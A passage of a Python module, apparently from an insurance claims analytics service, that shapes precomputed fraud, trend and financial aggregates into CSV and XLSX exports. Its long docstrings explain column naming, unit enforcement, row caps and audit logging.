"""The analyst workspace's one way out — CSV and XLSX of what is on screen
(FR-AN-6, Story 7.5).

Epic 7 shipped four sections that can narrow a book nine ways, trend it,
decompose its money and drill every figure to the claims behind it, and not one
number could leave the browser. This module is the way out, and its entire
design is a single refusal: **it computes nothing.**

## The export calls the function the chart calls

Every one of the eight targets below takes an *already-computed* aggregate — a
`FraudPanel`, a `FraudRates`, a `PortfolioTrends`, a `FinancialDecomposition`, a
`ReserveAdequacy`, or `drill_through.select`'s ranked list — and shapes it into
rows. Not "the same arithmetic": the same objects, produced by the same folds the
sibling route hands to its response model one function away. So a target cannot
re-derive a figure, re-count a cohort, re-rank a breakdown or re-cut a tail,
because there is nothing in this file that could: no threshold, no derivation, no
`sorted`, no arithmetic on a published number. The one exception is
`len(table.rows)` against the row cap, which is a fact about the table rather
than about the book.

That is the failure this story exists to prevent. An exported number that differs
from the one on the screen it was exported from is worse than no export at all —
it is a spreadsheet that will outlive the session, get mailed to a regulator, and
disagree with the console under a heading that says they are the same thing.

## Nothing is persisted, and the writer knows it

No blob store, no table, no `tempfile`, no path under any volume (AD-11). The CSV
is encoded out of an incremental `StringIO` that is drained and truncated as it
goes; the XLSX is built with `{"in_memory": True}` so that `xlsxwriter` holds its
worksheet parts in memory rather than spooling them, which is the reason
`pyproject.toml` names it rather than openpyxl. What happens to the file on the
analyst's machine afterwards is organizational policy and not this system's;
what happens to it here is that it exists for the length of one response and is
never written down.

## A data product, not a screenshot

DB `snake_case` column names, enum values exactly as stored, dates ISO-8601,
booleans `true`/`false`, money as integer cents in a `*_cents` column — which
`ExportColumn` enforces structurally rather than by convention — and **no
preamble row**. A comment line above the header is the single most common way a
generated CSV becomes unreadable to every parser that would consume it, and this
file is generated for exactly the consumers that would trip on one. The
formatting the UI does (`web/src/lib/money.ts`, the label maps) stays in the UI:
this is the payload in a rectangular shape, not the screen in a text file.

XLSX writes integers as numbers and everything else — dates, enums, booleans — as
strings, so the two formats hold the *same values* and a test can compare a
worksheet against a CSV cell for cell.

## Columns are the projection; rows are the screen's rows

The claim export publishes every column `select_drill_rows` already loaded under
the caller's scope, plus the derived values `select` computed for the ranking —
not the fourteen a queue card draws. Nothing new leaves the database: the read is
the read the list already takes, and an analyst entitled to the list is entitled
to the columns behind it. What "exactly what is on screen" governs is the **row**
set, which is where a scope or filter error would live and which
`tests/test_dataset_export.py` pins against the paged route's own pages.

## The gate, the cap and the audit row

The gate is `fraud.require_fraud_analytics_access` — the one analyst-workspace
allowlist, reused rather than re-declared, because a fifth section carrying a
fifth spelling of it is how a future `UserRole` gets admitted by one of them.

The cap is `export_limits.maxRows`, a rules-tier parameter (AD-8) whose refusal
names its value, exactly as `TrendRangeTooWide` names `maxBuckets`.

The audit row is `services/audit.record_export` and is emitted **after the table
is materialised and before the first byte leaves** — see `_finish`, which is the
one place the order is written down and the one place it can be got wrong.
"""

import csv
import io
import re
from collections.abc import Callable, Iterator, Mapping, Sequence
from dataclasses import dataclass, fields
from datetime import date
from enum import StrEnum
from typing import Any, Final

import xlsxwriter
from sqlalchemy.ext.asyncio import AsyncSession

from config import Settings
from data.context import CallerContext
from data.repositories import claims as claim_repo
from rules.parameters import (
    DerivationThresholds,
    ExportLimits,
    PriorityWeights,
    ReserveBands,
    TrendPeriods,
    reserve_bands_for,
)
from services import audit
from services.derivations import utc_today
from services.financials.reserve import ReserveCheck, reserve_checks_for_claims
from services.worklist import decomposition, drill_through, fraud, trends
from services.worklist.decomposition import (
    BreakdownDimension,
    FinancialDecomposition,
    ReserveAdequacy,
)
from services.worklist.drill_through import DrillFilters, RankedClaim
from services.worklist.fraud import (
    FraudPanel,
    FraudRates,
    FraudRateSorts,
    require_fraud_analytics_access,
)
from services.worklist.segmentation import (
    SEGMENTATION_WIRE_KEYS,
    Segmentation,
    VocabularyDivergence,
)
from services.worklist.trends import PortfolioTrends, TrendAnchor, TrendCohort, TrendGrain


class ExportFormat(StrEnum):
    """The two shapes a table may leave in. Closed, and the **type is the check**.

    `format=pdf` cannot reach this module: FastAPI coerces the query parameter
    into this enum and answers 422 before the service runs, which is
    `FraudRateSort`'s arrangement and its consequence — there is no vocabulary
    check in this file and there must not be one, or the enum would be spelled
    twice.

    Two members and no third. PDF is named in the story as out of scope and the
    reason is worth keeping: a PDF is a *rendering*, which would put layout,
    typography and page breaks in a module whose entire claim is that it decides
    nothing about how a figure reads. JSON is absent because the API already
    serves it, at the sibling route, to the client that asked.
    """

    csv = "csv"
    xlsx = "xlsx"


class ExportTarget(StrEnum):
    """What was exported — one member per fold this module shapes.

    The vocabulary of the `entity` column on the audit row, and therefore the
    words a compliance reader groups seven years of egress by. Snake_case per the
    enum convention: unlike `BreakdownDimension`, these are not facet names and
    nothing composes a `filter[…]` parameter from one.

    **Eight, and the two that are missing are decisions rather than gaps.** The
    red-flag frequency view is not exportable: it is the one analyst surface whose
    content is model output, which AD-10 holds must be labelled, timestamped and
    never authoritative — and a CSV strips exactly the labelling that makes that
    true, leaving a spreadsheet of sentences a model wrote that reads like a
    spreadsheet of findings. The financial Totals tiles are not exportable either:
    `KpiCard` wraps its body in a `<Link>`, so a button inside one would be
    invalid markup, and all three figures already travel on the breakdown export.
    Both omissions are stated on the surfaces that lack the control.

    Pinned at import to the folds below — see `_DISPATCHED`.
    """

    claims = "claims"
    fraud_bands = "fraud_bands"
    siu_pipeline = "siu_pipeline"
    fraud_rates = "fraud_rates"
    trend_series = "trend_series"
    financial_breakdown = "financial_breakdown"
    cost_drivers = "cost_drivers"
    reserve_adequacy = "reserve_adequacy"


#: What one cell may hold.
#:
#: Six types, and the interesting one is `float` — because it is the type this
#: union was very nearly written without. Every *quantity* this console publishes
#: is an integer over a stated scale (cents, basis points, whole days, a count),
#: which is the money convention reaching the last surface that could have broken
#: it: a float where cents belong could only have come from a division somebody
#: performed here, and there is no division in this file.
#:
#: `priority.priority_score` is the one exception and is not a quantity at all —
#: it is a **rank**, the float the drill list's ordering was computed with and the
#: float `DrillClaimRowResponse` already publishes. Admitting it is what lets the
#: claim export carry the value its own row order was decided by; excluding it
#: would leave a file nobody could sort back into the order they downloaded it
#: in, and rounding it into an `int` would leave a column that reproduces the
#: sort *almost* always, which is worse. It reaches exactly one cell, and
#: `ExportColumn` refuses to let it wear a unit.
#:
#: `None` is a cell that is genuinely absent — an unsplit series' cohort, an
#: empty cohort's average — and renders as an empty field rather than as a zero,
#: which is `TrendPoint.value`'s prohibition carried into the file.
type ExportValue = str | int | float | bool | date | None


class ExportUnit(StrEnum):
    """The scale a numeric column is on, when it is on one.

    Two members, because there are exactly two scales in this console a reader
    could misread by a factor of a hundred: money is integer **cents** and a rate
    is integer **basis points**. Counts and whole days carry no unit because
    there is nothing to get wrong about them.

    It exists to be *enforced* rather than published — see `ExportColumn`, which
    refuses a name that does not carry its unit. There is no preamble row and no
    units row in the file, so the column name is the only place a consumer can
    learn the scale, and a convention that lives only in a docstring is a
    convention that a ninth column breaks.
    """

    cents = "cents"
    basis_points = "bp"


@dataclass(frozen=True)
class ExportColumn:
    """One column: the name a header row carries, and the scale behind it.

    The name is the **DB spelling**, `snake_case`, and never the UI's label. A
    column headed "Total Paid" is a screen; `paid_cents` is a field a consumer
    can join on, and the whole difference between the two is who owns the copy.

    `__post_init__` holds the money convention **structurally**, which is the one
    piece of validation in this module and the one that earns its place: "money
    leaves as integer cents in a `*_cents` column" is a rule stated in three
    specs and enforced nowhere, and the failure it prevents is silent — a
    `total_paid` column of cents read as dollars is a spreadsheet wrong by two
    orders of magnitude that looks entirely plausible. The check runs both ways:
    a column *with* a unit must carry its suffix, and a column *without* one must
    not carry a suffix it does not mean, so `reserve_cents` cannot be declared
    unitless and `rate_bp` cannot be declared as cents.
    """

    name: str
    unit: ExportUnit | None = None

    def __post_init__(self) -> None:
        suffixes = {f"_{unit.value}": unit for unit in ExportUnit}
        carried = next(
            (unit for suffix, unit in suffixes.items() if self.name.endswith(suffix)), None
        )
        if carried is not self.unit:
            raise ValueError(
                f"export column {self.name!r} declares unit {self.unit!r} and its name "
                f"carries {carried!r} — a scale a consumer cannot read off the header "
                "is a scale a consumer will get wrong"
            )


@dataclass(frozen=True)
class ExportTable:
    """One rectangular answer: what it is, its header, and its rows.

    Rows are tuples rather than mappings, and the shape is the contract: a row is
    positional against `columns`, so a fold that emitted a short row or an extra
    field is a `ValueError` here rather than a column silently shifting one place
    to the left halfway down a file. `__post_init__` checks every row rather than
    the first, because the row that goes wrong is the one whose branch is rare —
    an empty cohort, a `None` label, the one group with no employer behind it.

    `target` rides on the table rather than being passed alongside it, for
    `RateBreakdown.sort`'s reason: the table is what gets audited, named and
    rendered, and a shape that let a caller name one target while carrying
    another's rows is the shape this story's audit row exists not to have.

    An **empty table keeps its columns**, which is what makes "a filter no claim
    satisfies is a 200 with a header row and nothing under it" a property of the
    type rather than of a branch in the renderer. A zero-row CSV with no header is
    an empty file, and an empty file is indistinguishable from a failed download.
    """

    target: ExportTarget
    columns: tuple[ExportColumn, ...]
    rows: tuple[tuple[ExportValue, ...], ...]

    def __post_init__(self) -> None:
        width = len(self.columns)
        for index, row in enumerate(self.rows):
            if len(row) != width:
                raise ValueError(
                    f"{self.target.value} row {index} has {len(row)} cells against "
                    f"{width} columns — a positional row that does not match its "
                    "header shifts every field after it"
                )


class ExportTooLarge(ValueError):
    """The table is longer than the rules document allows.

    The cap is `export_limits.maxRows` and the refusal **names it**, alongside the
    count that exceeded it, because the caller's only useful next move is to
    narrow the segmentation and they cannot judge how far without both numbers.
    `TrendRangeTooWide` is the precedent in every respect, over a different kind
    of size.

    A `ValueError` rather than a new exception root, and deliberately not a
    subclass of anything in `api/`: the service tier raises a refusal in its own
    vocabulary and the router owns the problem type, which is
    `_export_too_large`'s half of `_trend_range_too_wide`'s arrangement.
    """


class ExportUnwritable(RuntimeError):
    """The spreadsheet writer refused a cell and the workbook would be a lie.

    `xlsxwriter` reports per-cell failures as **negative return codes rather than
    exceptions** — `-1` for a coordinate outside the sheet, `-2` for a string
    longer than the 32,767 characters a cell may hold, which it silently
    truncates — and a caller that ignores them gets a workbook that closes
    cleanly, opens cleanly, and is missing data. That is the worst shape a
    failure can take on this path: the audit row beside it names the real count,
    the CSV of the same query carries every row, and the spreadsheet the analyst
    actually mails to a regulator quietly holds fewer. An export that fails is
    recoverable; an export that lies is not.

    A `RuntimeError` rather than a `ValueError` and deliberately **not** an
    `ExportTooLarge`: nothing the caller can put in a query string fixes it, so
    it is not a refusal to be translated into a 422 the way the cap is. It is a
    500 — the I/O matrix's "writer raises" row — and the residual it leaves is
    the one `_finish` already documents: an audit row for a file that never
    reached the wire, which is the direction an egress log should err in.
    """


def _require_total(mapping: Mapping[Any, object], vocabulary: type[StrEnum], what: str) -> None:
    """Refuse, at import, a table that does not answer every member of an enum.

    The shape `segmentation.VocabularyDivergence` was written for, extracted here
    because this module has **two** such tables — `_DISPATCHED` and `MEDIA_TYPE`
    — and a guard written twice is a guard the third table gets written without.
    An explicit `raise` rather than an `assert` for that class's recorded reason:
    `python -O` strips asserts, and "every member of this enum is answered" is
    the whole contract of the tables below rather than a debugging aid.

    **A function rather than two inline `if`s, so the guard is itself testable.**
    An import-time check cannot be re-triggered from a test — the module is
    already imported — so the only "would notice" available is to hand the same
    predicate a table that has diverged and watch it refuse. That is what
    `tests/test_dataset_export.py` does, and it is the difference between a guard
    that is asserted to hold today and one that is known to fire.

    The message names the *symmetric* difference rather than what is missing,
    because the two failures are opposite and equally silent: a member with no
    entry is a target nothing can shape, and an entry with no member is a fold
    nothing can reach. Keys are rendered through `getattr(…, "value", …)` rather
    than as `member.value`, because the second kind of divergence is precisely a
    key that is *not* a member of the enum — so the branch that reports it cannot
    assume it has one, and a guard that raised an `AttributeError` while
    explaining a mistake would replace a legible failure with an illegible one.
    """
    diverged = frozenset(mapping) ^ frozenset(vocabulary)
    if diverged:
        named = sorted(str(getattr(member, "value", member)) for member in diverged)
        raise VocabularyDivergence(f"{what} have diverged: {named}")


#: The media type each format is served as.
#:
#: A mapping rather than a method on `ExportFormat`, so the wire contract is one
#: table a reviewer reads once instead of a branch inside the router. The
#: spreadsheet type is the full OOXML one rather than `application/vnd.ms-excel`,
#: which is the *old* binary format and would make a browser offer to open a
#: 2007-era file that is not what these bytes are.
#:
#: No `charset` on either: Starlette appends one to `text/*` itself, and the XLSX
#: type is a zip container for which a charset is meaningless.
#:
#: **Checked total over `ExportFormat` at import**, exactly as `_DISPATCHED` is
#: checked over `ExportTarget`, and the omission of this guard was worth closing
#: rather than arguing away: a third member added to `ExportFormat` and forgotten
#: here has two failure modes and neither is loud. `MEDIA_TYPE[fmt]` in
#: `_download` is a `KeyError` *per request* — a 500 on one format while the
#: other two work — and the `fmt is ExportFormat.csv else …` branch beside it
#: would meanwhile have rendered the new format as XLSX under a name promising
#: otherwise. A closed vocabulary with an open table is not a closed vocabulary.
MEDIA_TYPE: Final[Mapping[ExportFormat, str]] = {
    ExportFormat.csv: "text/csv",
    ExportFormat.xlsx: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
}
_require_total(MEDIA_TYPE, ExportFormat, "ExportFormat and the media types it is served as")

#: How much rendered CSV accumulates in the buffer before a chunk is yielded.
#:
#: A module constant rather than a rules-tier parameter, `BREAKDOWN_LIMIT`'s
#: ruling: this decides nothing a reader sees and nothing the business tunes — it
#: is the size of an object between two function calls.
#:
#: **Characters, not bytes, and the name says so** — which it did not until a
#: review pointed at the mismatch. The buffer is a `StringIO`, so `tell()` is a
#: position in *characters*; the seeded plant names alone carry en dashes, so the
#: two counts genuinely differ and a constant called `_BYTES` compared against a
#: character offset was documenting a measurement nobody was taking. The
#: alternative — encoding the buffer to count its bytes and then encoding it
#: again to emit it — would put the whole pending chunk through UTF-8 twice per
#: row, which is precisely the double residency the drain-and-truncate loop
#: exists to avoid. So the count is characters and the bound is stated in
#: characters: the buffer is drained as soon as it passes the constant, so a
#: chunk is 64 KiB of characters plus at most one row, and at most four bytes
#: per character on the wire. Still comfortably above the socket buffer, and
#: still small enough that a whole export is never resident twice.
#:
#: The size is written as `64 * 1024` and described in KiB rather than spelled
#: out as a decimal count, which is not style: `test_derivations.py`'s
#: "no module outside the registry hardcodes the band" greps this whole tree for
#: the four risk/fraud/age edges as bare integers, and this constant's decimal
#: expansion begins with one of them — on a chunk size that is not a band and
#: never was. That guard is a grep for known numbers rather than a check that no
#: rule value is inlined, which its own docstring says at length, so the honest
#: response to a false positive is to write the number in the form that does not
#: collide rather than to widen an allowlist.
_CSV_CHUNK_CHARS: Final[int] = 64 * 1024

#: The tallest a worksheet can be — 1,048,576 rows including the header (ECMA-376).
#:
#: A structural fact about the format rather than a policy, which is why it is
#: here and not in `export_limits.jdm.json` beside `maxRows`: a compliance owner
#: retunes how much PHI one request may extract, and nobody anywhere retunes how
#: many rows fit in a sheet. The two bound different things and are checked in
#: that order — the policy cap first, because it is the one whose refusal a
#: caller can act on by narrowing.
#:
#: It is checked *at all* because `maxRows` is explicitly a document designed to
#: be retuned without a deploy ("Given the row cap is retuned in its rule
#: document…"), so an owner who raises it past this number is one edit away from
#: an export that would otherwise **truncate silently**: `worksheet.write_*`
#: answers a negative code for a row past the end and `xlsxwriter` writes the
#: short workbook anyway, while the audit row and the CSV of the same query both
#: report the full count. A file that disagrees with its own audit trail is the
#: exact failure this module's docstring says it exists to prevent.
_XLSX_MAX_ROWS: Final[int] = 1_048_576

#: The one worksheet an XLSX export carries, and its name.
#:
#: One sheet rather than one per target, because a table is a table: a workbook
#: whose second sheet was a "notes" or "filters" page would be the preamble row
#: this file refuses, moved somewhere a parser is even less likely to look. The
#: name is generic for the same reason a filename is not: Excel caps a sheet name
#: at thirty-one characters and forbids five punctuation marks, so a name derived
#: from a target would be a truncation rule this module would have to own.
_WORKSHEET_NAME: Final[str] = "export"


# --- the eight folds ------------------------------------------------------
#
# Each takes an already-computed aggregate and shapes it. None of them reads a
# rule, computes a figure, or changes an order — see the module docstring.


#: The claim export's header, in the order a reader scans it.
#:
#: **Twenty-eight stored columns, then the seven derived values `select`
#: computed, then the score it ranked on.** The stored twenty-eight are exactly
#: `DrillClaim`'s fields — everything `select_drill_rows` already loaded under
#: `employer_scope(ctx)` — rather than the fourteen `DrillRow` publishes, because
#: nothing new leaves the database by adding them: the read is the read the list
#: already takes, and a caller entitled to the list is entitled to the columns
#: behind it. What "exactly what is on screen" governs is the row set.
#:
#: The seven derived ones are `DrillFlags` minus `reserve_verdict`, and the
#: omission is the one column decision here worth arguing. That field is `None`
#: unless `filter[reserveVerdict]` is set — the map is loaded conditionally so
#: that every other drill URL stays at one scoped read — so a column for it would
#: be empty on almost every export and populated on a few, which is a column that
#: means "we did not look" and reads as "there is no verdict". A blank that a
#: consumer cannot tell from an answer is worse than an absent column, and the
#: verdict has its own export at `/dashboard/financials/reserve-adequacy/export`.
#:
#: `days_open` and `priority_score` are the two derived values that are *not*
#: flags, and both are here for the same reason: they are what the list is
#: ordered by and what its ages read, so an export without them could not be
#: sorted back into the order it was downloaded in.
_CLAIM_COLUMNS: Final[tuple[ExportColumn, ...]] = (
    ExportColumn("claim_id"),
    ExportColumn("stage"),
    ExportColumn("status"),
    ExportColumn("return_status"),
    ExportColumn("severity_score"),
    ExportColumn("days_open"),
    ExportColumn("injury_type"),
    ExportColumn("worker_name"),
    ExportColumn("employer_short_name"),
    ExportColumn("surgery_required"),
    ExportColumn("litigation_flag"),
    ExportColumn("fraud_flag"),
    ExportColumn("fraud_score"),
    ExportColumn("employer_id"),
    ExportColumn("handler_id"),
    ExportColumn("handler_name"),
    ExportColumn("state"),
    ExportColumn("osha_recordable"),
    ExportColumn("froi_date"),
    ExportColumn("doi"),
    ExportColumn("disability"),
    ExportColumn("sector"),
    ExportColumn("region"),
    ExportColumn("icd"),
    ExportColumn("age"),
    ExportColumn("gender"),
    ExportColumn("reserve_cents", ExportUnit.cents),
    ExportColumn("recovery"),
    # The registry's answers, as `select` computed them for the ranking — never
    # recomputed here (AD-10).
    ExportColumn("risk_band"),
    ExportColumn("fraud_band"),
    ExportColumn("age_group"),
    ExportColumn("fraud_flagged"),
    ExportColumn("siu_review"),
    ExportColumn("rtw_blocked"),
    ExportColumn("payment_due"),
    ExportColumn("priority_score"),
)


def claims_table_of(ranked: Sequence[RankedClaim]) -> ExportTable:
    """The drill list, whole and in its own order. Pure.

    Takes `drill_through.select`'s output rather than a page of `DrillRow`s, and
    that is the difference AC 2 turns on: `select` returns the **entire** ranked
    population and `drill_through_claims` cuts a window out of it, so an export
    built from the paged type could only ever contain the page that happened to
    be loaded. Every row of every page, in the order the queue's own scorer put
    them in.

    Nothing here sorts. The sequence arrives ranked by `priority.order_key` over
    `priority.priority_score` — the queue's ordering and the queue's scorer, not
    a second arithmetic — and this function's contribution is `tuple(...)`.

    `priority_score` is written as the float `select` computed, deliberately
    un-rounded: it is the value the *ordering* used, and a rounded copy would be
    a column that could not reproduce the sort it sits beside. It is the one
    non-integer in this module and is a rank rather than a quantity, which is why
    it carries no unit.
    """
    return ExportTable(
        target=ExportTarget.claims,
        columns=_CLAIM_COLUMNS,
        rows=tuple(
            (
                entry.claim.claim_id,
                entry.claim.stage.value,
                entry.claim.status.value,
                entry.claim.return_status.value,
                entry.claim.severity_score,
                entry.claim.days_open,
                entry.claim.injury_type,
                entry.claim.worker_name,
                entry.claim.employer_short_name,
                entry.claim.surgery_required,
                entry.claim.litigation_flag,
                entry.claim.fraud_flag,
                entry.claim.fraud_score,
                entry.claim.employer_id,
                entry.claim.handler_id,
                entry.claim.handler_name,
                entry.claim.state,
                entry.claim.osha_recordable,
                entry.claim.froi_date,
                entry.claim.doi,
                entry.claim.disability.value,
                entry.claim.sector,
                entry.claim.region,
                entry.claim.icd,
                entry.claim.age,
                entry.claim.gender.value,
                entry.claim.reserve,
                entry.claim.recovery.value,
                entry.flags.risk.value,
                entry.flags.fraud_band.value,
                entry.flags.age_group.value,
                entry.flags.fraud_flagged,
                entry.flags.siu_review,
                entry.flags.rtw_blocked,
                entry.flags.payment_due,
                entry.priority_score,
            )
            for entry in ranked
        ),
    )


#: The band distribution's header — the donut's two facts per arc.
_FRAUD_BAND_COLUMNS: Final[tuple[ExportColumn, ...]] = (
    ExportColumn("fraud_band"),
    ExportColumn("claims"),
)


def fraud_bands_table_of(panel: FraudPanel) -> ExportTable:
    """The fraud-score distribution, arc for arc. Pure.

    **Zero-filled, because the panel is** — all three members in `FraudBand`'s
    declaration order, including one no claim in the segment reached. That is
    `fraud._banded`'s rule arriving in a file rather than on a screen, and it is
    sharper here: a spreadsheet with two rows in it cannot be told from a
    spreadsheet whose third row was dropped, and "no claim in this book scored
    into the high band" is the single most valuable thing this export can say.
    The rows are the distribution's own; this function does not decide which
    exist.
    """
    return ExportTable(
        target=ExportTarget.fraud_bands,
        columns=_FRAUD_BAND_COLUMNS,
        rows=tuple((item.key, item.count) for item in panel.by_band.items),
    )


#: The SIU pipeline's header — two series over one population, one table.
#:
#: `dimension` is the first column because the two halves of the card are two
#: groupings of the same referred claims (by stage, then by handler) and a
#: rectangular file has to say which grouping a row belongs to. Two exports would
#: have been the alternative and would have split one card's control in two; a
#: `dimension` column is what a consumer filters on, which is the same gesture.
#:
#: `label` is `None` for the stage rows, `BreakdownGroup.label`'s split: a stage
#: is a token whose copy the UI owns and whose stored value is what a consumer
#: joins on, while a handler id is not a name and nothing downstream can turn `4`
#: into a person.
_SIU_PIPELINE_COLUMNS: Final[tuple[ExportColumn, ...]] = (
    ExportColumn("dimension"),
    ExportColumn("key"),
    ExportColumn("label"),
    ExportColumn("claims"),
)


def siu_pipeline_table_of(panel: FraudPanel) -> ExportTable:
    """The SIU pipeline — by stage, then by handler, each in the card's order. Pure.

    Absent categories stay absent, which is the opposite of the band export one
    function up and is `fraud._pipeline`'s rule rather than `_banded`'s: `stage`
    is a *column*, so a stage with no referred claim is a stage this pipeline
    does not reach rather than a segment that is empty, and a handler carrying no
    SIU work is not a desk this list is about. The two exports sit adjacent so
    the difference is legible, exactly as the two folds do.

    Stage rows before handler rows, and each block in the distribution's own
    order — count descending, then name, then id for the handlers. Nothing here
    re-orders.
    """
    return ExportTable(
        target=ExportTarget.siu_pipeline,
        columns=_SIU_PIPELINE_COLUMNS,
        rows=(
            *(("stage", item.key, None, item.count) for item in panel.siu_by_stage.items),
            *(
                ("handler", str(item.handler_id), item.handler_name, item.count)
                for item in panel.siu_by_handler.items
            ),
        ),
    )


#: The rate tables' header — three breakdowns of one shape.
_FRAUD_RATE_COLUMNS: Final[tuple[ExportColumn, ...]] = (
    ExportColumn("dimension"),
    ExportColumn("key"),
    ExportColumn("label"),
    ExportColumn("flagged"),
    ExportColumn("claims"),
    ExportColumn("rate_bp", ExportUnit.basis_points),
)


def fraud_rates_table_of(rates: FraudRates) -> ExportTable:
    """The three flagged-rate breakdowns, in each table's own order. Pure.

    **Truncated exactly as the card truncates**, which costs this function
    nothing: `fraud._breakdown` already cut the injury-type table at the eight
    types with the most claims and left the other two uncut, so the rows that
    arrive here are the rows on screen. A fold that exported "the whole
    breakdown, since a file has room" would be publishing a set the card never
    showed under a heading that says it is the card's — and would have to make
    the ranking decision the card makes, which is the second computer this
    module exists not to be.

    `rate_bp` travels beside `flagged` and `claims` for `InjuryTypeRate`'s
    reason: a rate over a thin bucket is uninterpretable, and the honest fix is
    the denominator beside the figure rather than a suppression rule invented
    here. In a spreadsheet it is also the difference between a column a reader
    can check and one they have to trust.
    """
    return ExportTable(
        target=ExportTarget.fraud_rates,
        columns=_FRAUD_RATE_COLUMNS,
        rows=(
            *(
                (
                    "injury_type",
                    row.injury_type,
                    row.injury_type,
                    row.flagged,
                    row.claims,
                    row.rate_bp,
                )
                for row in rates.by_injury_type.items
            ),
            *(
                ("employer", str(row.employer_id), row.label, row.flagged, row.claims, row.rate_bp)
                for row in rates.by_employer.items
            ),
            *(
                (
                    "handler",
                    str(row.handler_id),
                    row.handler_name,
                    row.flagged,
                    row.claims,
                    row.rate_bp,
                )
                for row in rates.by_handler.items
            ),
        ),
    )


#: The trend export's header — one row per (series, bucket), long rather than wide.
#:
#: **Long form, and the shape is the decision.** A wide table with one column per
#: bucket would read like the chart and would be a different table every time the
#: grain or the window changed, so no two exports of this section could be
#: appended to each other or loaded into the same model. Long form gives one
#: stable header for every window, which is what makes the file a data product
#: rather than a picture of one.
#:
#: `value` carries **no unit**, and it is the one column in this module that
#: cannot: the five metrics are a count, two day means, a basis-point rate and a
#: cents sum, so the scale is a property of the row rather than of the column.
#: `metric` is what says which — `TrendMetric`'s members carry their own units in
#: their names (`paid_cents`, `rtw_rate_bp`) precisely so that this stays legible.
#:
#: `low_confidence` and `partial` are the server's verdicts and travel with the
#: figure they qualify. Dropping them would export a mean over two claims and a
#: half-finished month as though they were ordinary points, which is the
#: statistical dishonesty (NFR-3) the whole section is arranged to avoid.
_TREND_COLUMNS: Final[tuple[ExportColumn, ...]] = (
    ExportColumn("metric"),
    ExportColumn("cohort_key"),
    ExportColumn("cohort_label"),
    ExportColumn("bucket_key"),
    ExportColumn("bucket_label"),
    ExportColumn("bucket_from"),
    ExportColumn("bucket_to"),
    ExportColumn("value"),
    ExportColumn("claim_count"),
    ExportColumn("low_confidence"),
    ExportColumn("partial"),
)


def trend_series_table_of(computed: PortfolioTrends) -> ExportTable:
    """Every point of every series, in the payload's own order. Pure.

    Series outer, points inner, both in the order `trends_of` published them —
    the section's reading order for the metrics and the window's ascending order
    for the buckets. Nothing here sorts and nothing here drops: a metric with
    nothing to say in a bucket exports `value` empty rather than skipping the
    row, because a series with a hole in its index is two series that disagree
    about where March is.

    An **empty cell is empty and never a zero**, which is `TrendPoint.value`'s
    prohibition reaching the file. A settlement mean over a month in which
    nothing settled is not zero days; a CSV that said `0` there would be the line
    drawn through zero that this whole section exists not to draw, saved to disk
    where nobody can see the caption that would have explained it.
    """
    return ExportTable(
        target=ExportTarget.trend_series,
        columns=_TREND_COLUMNS,
        rows=tuple(
            (
                series.metric.value,
                series.cohort_key,
                series.cohort_label,
                point.bucket_key,
                point.bucket_label,
                point.bucket_from,
                point.bucket_to,
                point.value,
                point.claim_count,
                point.low_confidence,
                point.partial,
            )
            for series in computed.series
            for point in series.points
        ),
    )


#: The breakdown export's header — the card's rows with their money.
_BREAKDOWN_COLUMNS: Final[tuple[ExportColumn, ...]] = (
    ExportColumn("dimension"),
    ExportColumn("key"),
    ExportColumn("label"),
    ExportColumn("claim_count"),
    ExportColumn("paid_cents", ExportUnit.cents),
    ExportColumn("reserve_cents", ExportUnit.cents),
    ExportColumn("projected_cents", ExportUnit.cents),
)


def financial_breakdown_table_of(computed: FinancialDecomposition) -> ExportTable:
    """The money breakdown's groups, ranked and cut as the card has them. Pure.

    `decomposition._breakdown` already ranked by projected cost descending with
    the key as tie-break and cut at `BREAKDOWN_LIMIT`, so this exports the twelve
    rows the bars draw and not the thirty-four the segment holds. Exporting the
    untruncated set would mean this function deciding a ranking — the second
    computer — and would produce a file that disagreed with the caption ("top 12
    of 34") on the card it came from.

    `dimension` is repeated on every row rather than stated once, because there
    is no once: a rectangular file has no place to put a scalar, and the
    alternative is the preamble row this module refuses. It also makes two
    exports of two groupings concatenable, which is the whole benefit of a
    self-describing row.

    The **portfolio totals are deliberately not here**, and their absence is the
    same argument `FinancialBreakdown` makes for having no `total` field: they
    are a whole-segment figure that does not move when the tail is cut, so a row
    carrying them would be either the kept groups' sum (contradicting the card)
    or a repeated scalar a consumer would sum by accident.
    """
    return ExportTable(
        target=ExportTarget.financial_breakdown,
        columns=_BREAKDOWN_COLUMNS,
        rows=tuple(
            (
                computed.breakdown.dimension.value,
                group.key,
                group.label,
                group.claim_count,
                group.totals.paid_cents,
                group.totals.reserve_cents,
                group.totals.projected_cents,
            )
            for group in computed.breakdown.items
        ),
    )


#: The cost-driver export's header — four cohorts, two pairs.
_COST_DRIVER_COLUMNS: Final[tuple[ExportColumn, ...]] = (
    ExportColumn("facet"),
    ExportColumn("cohort"),
    ExportColumn("claim_count"),
    ExportColumn("paid_cents", ExportUnit.cents),
    ExportColumn("reserve_cents", ExportUnit.cents),
    ExportColumn("projected_cents", ExportUnit.cents),
    ExportColumn("average_projected_cents", ExportUnit.cents),
)


def cost_drivers_table_of(computed: FinancialDecomposition) -> ExportTable:
    """Both cost-driver pairs — four rows, in the cards' order. Pure.

    Surgery then litigation, and within each the driver cohort before its
    complement, which is how the two cards read. Four rows rather than two
    because `CostDriverPair` is a **partition**: publishing only the driver side
    would let a reader compare a surgical cohort against a portfolio total that
    contains it, which is the comparison the story's word "versus" rules out, and
    the counts beside the averages are what make a three-claim litigated cohort
    visible as three claims.

    `average_projected_cents` is **empty, never zero**, for an empty cohort —
    `CostDriverCohort`'s sentinel carried into the file. A cohort reporting `0`
    in a spreadsheet is a cohort that costs nothing, and the reader who sums that
    column has no way to know otherwise.

    `cohort` is the facet *value* (`true`/`false`) rather than a word of this
    module's choosing, because that is the string `filter[surgery]` takes: a
    consumer who wants the claims behind a row can build the URL from the row.
    """
    return ExportTable(
        target=ExportTarget.cost_drivers,
        columns=_COST_DRIVER_COLUMNS,
        rows=tuple(
            (
                pair.facet,
                cohort.key,
                cohort.claim_count,
                cohort.totals.paid_cents,
                cohort.totals.reserve_cents,
                cohort.totals.projected_cents,
                cohort.average_projected_cents,
            )
            for pair in (computed.surgery, computed.litigation)
            for cohort in (pair.with_driver, pair.without_driver)
        ),
    )


#: The reserve-adequacy export's header — Epic 3's verdicts, counted.
_ADEQUACY_COLUMNS: Final[tuple[ExportColumn, ...]] = (
    ExportColumn("reserve_verdict"),
    ExportColumn("claims"),
)


def reserve_adequacy_table_of(adequacy: ReserveAdequacy) -> ExportTable:
